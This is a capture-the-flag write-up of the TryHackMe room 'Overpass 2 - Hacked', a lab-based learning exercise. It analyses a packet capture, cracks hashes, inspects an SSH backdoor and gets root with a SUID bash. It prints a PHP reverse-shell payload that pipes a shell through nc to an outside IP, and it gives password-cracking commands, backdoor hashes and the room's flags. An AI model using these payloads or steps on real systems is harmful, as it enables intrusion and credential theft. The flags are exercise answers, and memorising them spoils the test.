---
title: Overpass 2 - Hacked
layout: post
author: Bit Criminals Team
date: 2021-06-28 21:55:00 +0530
type: Pentesting
difficulty: Easy
prompt: https://tryhackme.com/room/overpass2hacked
---

This room was not like the usual ones. We had to first analyze a .pcapng file. 

# Forensics - Analyse the PCAP

**What was the URL of the page they used to upload a reverse shell?**

![](/images/Mars/overpass1.png)

On close observation, you will find that the page is ```/development/```

**What payload did the attacker use to gain access?**

![](/images/Mars/overpass2.png)

When we followed the TCP stream of the packet with /development/uploads.php and found the above. Hence, the payload the attacker used was 
```<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>```

**What password did the attacker use to privesc?**

![](/images/Mars/overpass3.png)

On following the TCP streams available we found this goldmine of information. Clearly the password the attacker used was the password of James.
```whenevernoteartinstant```

**How did the attacker establish persistence?**

![](/images/Mars/overpass4.png)

On going further through the above TCP stream, we understood that the attacker planted an ssh backdoor to establish persistence. Clearly, he did so by cloning the following github repository.
```https://github.com/NinjaJc01/ssh-backdoor```

**Using the fasttrack wordlist, how many of the system passwords were crackable?**

Futher down in the same TCP stream, the attacker viewed the "/etc/shadow" file. Here we found the password hashes of five users. (Refer the image above)
We copied the password hashes into another file and used John the Ripper to crack the hashes. We used the fasttrack wordlist as per the requirment. The command used was
>john --wordlist=/usr/share/wordlists/fasttrack.txt hash1

![](/images/Mars/overpass6.png)

Hence ```4``` hashes were cracked.

# Research - Analyse the code

The attacker created a backdoor using the code from ***https://github.com/NinjaJc01/ssh-backdoor***. So we cloned this repository to analyze the code.

**What's the default hash for the backdoor?**

In the main.go file, we found the default hash for the back door. Also note the port 2222 which the attacker used.

![](/images/Mars/overpass7.png)

```bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3```

**What's the hardcoded salt for the backdoor?**

Futher down in the same file we found the hardcoded salt for the backdoor.

![](/images/Mars/overpass8.png)

```1c362db832f3f864c8c2fe05f2002a05```

**What was the hash that the attacker used? - go back to the PCAP for this!**

![](/images/Mars/overpass5.png)

```6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed```

**Crack the hash using rockyou and a cracking tool of your choice. What's the password?**

We created a file with the above hash and the hardcoded salt for the backdoor in the format hash$salt ahd used John the Ripper.
>john -form=dynamic='sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt hash2

The password was ```november16```


# Attack - Get back in!

**The attacker defaced the website. What message did they leave as a heading?**

On opening the website "http://10.10.114.96", we found this.

![](/images/Mars/overpass10.png)

```H4ck3d by CooctusClan```

**What's the user flag?**

We had to begin with nmap scan, but this time it was unusually long. But we knew that the attacker used port 2222. So we logged in at port 2222 uing ssh
>ssh -p 2222 james@<10.10.114.96>

Finally result of the nmap scan came!
![](/images/Mars/overpass9.png)

We found the user falg in user.txt in the home directory of james.

![](/images/Mars/overpass11.png)

```thm{d119b4fa8c497ddb0525f7ad200e6567}```

**What's the root flag?**

Now comes the best part, privelage escelation.
We tried "sudo -l" as usual but this time the old password was incorrect. This meant the password was changed. The attacker is a smart guy!
Searching for a way to break in, we looked at all the files in the home directory. We found an unusual executable file owned by root.

![](/images/Mars/overpass12.png)

On execution using "./.suid_bash" it gave us a shell, but the user was still james. So this time we executed
>./.suid_bash -p

 We became the root!!!

![](/images/Mars/overpass13.png)

```thm{d53b2684f169360bb9606c333873144d}```










